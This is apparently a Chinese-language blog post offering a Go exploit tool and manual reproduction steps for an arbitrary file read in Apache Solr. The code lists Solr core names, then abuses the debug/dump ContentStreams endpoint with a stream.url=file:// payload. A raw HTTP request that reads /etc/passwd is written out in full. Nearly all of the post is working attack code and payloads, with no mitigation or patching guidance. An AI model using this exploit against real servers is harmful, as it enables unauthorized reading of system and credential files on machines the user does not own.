### 工具

下载地址：https://github.com/yuyan-sec/Poc-Project/tree/main/solr

写了一个小工具，运行效果如下

![img](https://mmbiz.qlogo.cn/mmbiz_png/MZzibwD3j5oGWgchR42adxSdllxLwEtqmV3ia1KGA8aM8BGBjXs17OM1nmFdUPCJPCLmtmtZURPoMqw2QuLT1TDw/0?wx_fmt=png)

辣鸡代码

```go
package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"crypto/tls"
	"time"
	"regexp"
	"strings"
	"flag"
)

var t = &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}

var c = &http.Client{
    Transport: t,
    Timeout:   5 * time.Second,
}

func main(){

	var host, file string
	flag.StringVar(&host,"u","","URL : http://127.0.0.1")
	flag.StringVar(&file,"f","","File: /etc/passwd")
	flag.Parse()

	if host == "" || file == ""{
		fmt.Println(`
███████╗ ██████╗ ██╗     ██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗
███████╗██║   ██║██║     ██████╔╝
╚════██║██║   ██║██║     ██╔══██╗
███████║╚██████╔╝███████╗██║  ██║
╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
Apache Solr 任意文件读取  BY:T9Sec     
`)
	}else{
		poc(host,file)
	}
	
}


func poc(url , payload string){
    
    url = strings.TrimRight(url,"/")
    geturl := url+"/solr/admin/cores?indexInfo=false&wt=json"

    req, err := http.NewRequest("GET", geturl, nil)
    if err != nil {
        return
    }
    req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
    
    r, err := c.Do(req)
    if err != nil {
        return
    }
    defer r.Body.Close()
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return
    }

    if r.StatusCode == 200{
    	result := string(body)
	    reg := regexp.MustCompile(`"name":"(?s:(.*?))"`)
	    name := reg.FindAllStringSubmatch(result,-1)
	    path := name[0][1]
	    
	    exp(url,path,payload)
    }else{
    	fmt.Println("fail");
    }
    
}

func exp(url, path, payload string){
	url = url+"/solr/"+path+"/debug/dump?param=ContentStreams"
	payload = "stream.url=file://"+payload

    r, err := c.Post(
		url,
		"application/x-www-form-urlencoded",
		strings.NewReader(payload))
    if err != nil {
        return
    }
    defer r.Body.Close()
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return
    }
    
    if r.StatusCode == 200{
	    result := string(body)
	    reg := regexp.MustCompile(`"stream":"(.*?)"`)
	    name := reg.FindAllStringSubmatch(result,-1)
	    fileText := name[0][1]

	    fmt.Println(strings.Replace(fileText,"\\n","\n",-1))
	}else{
    	fmt.Println("fail");
    }
}
```

### 复现过程

1、先访问获取一个 name

```
http://127.0.0.1/solr/admin/cores?indexInfo=false&wt=json
```

![img](https://mmbiz.qlogo.cn/mmbiz_png/MZzibwD3j5oGWgchR42adxSdllxLwEtqm0uKAP5mKicQtFPRJdGOJVGcKHkInh5hRBPWFWFSNwEIaPRVw2141Zgg/0?wx_fmt=png)

2、读取文件

```
POST /solr/输入上面获取到的name作为目录/debug/dump?param=ContentStreams HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

stream.url=file:///etc/passwd
```

![img](https://mmbiz.qlogo.cn/mmbiz_png/MZzibwD3j5oGWgchR42adxSdllxLwEtqmVph4y88wm3HiaPCgCBDzC9bUn4FkoRBH32KrF00On2qBiaialprvAwhhg/0?wx_fmt=png)
